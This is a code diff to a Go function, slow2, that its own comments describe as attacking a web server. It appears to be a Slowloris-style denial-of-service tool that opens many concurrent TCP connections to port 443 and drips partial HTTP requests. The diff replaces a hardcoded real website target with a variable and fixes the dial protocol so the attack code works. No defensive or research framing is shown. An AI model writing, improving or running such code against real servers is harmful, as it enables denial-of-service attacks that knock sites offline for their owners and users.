@@ -9,7 +9,7 @@ import (
 
 func slow2() {
 	// targetHost is the hostname or IP address of the web server you want to attack
-	targetHost := "thawdezin.netlify.app"
+	targetHost := _host
 
 	// Interval between sending partial HTTP requests
 	interval := time.Second
@@ -21,13 +21,12 @@ func slow2() {
 	for i := 0; i < maxProcs; i++ {
 		go func() {
 			// Set up a connection to the target host
-			conn, err := net.Dial("http", targetHost+":443")
+			conn, err := net.Dial("tcp", targetHost+":443")
 			if err != nil {
-				fmt.Println(err)
+				//fmt.Println(err)
+				newErr := fmt.Errorf("Slow2 http Error: %v", err)
+				fmt.Println(newErr)
 				return
-			} else {
-				print("OK\n")
-				slow2()
 			}
 			defer conn.Close()
 
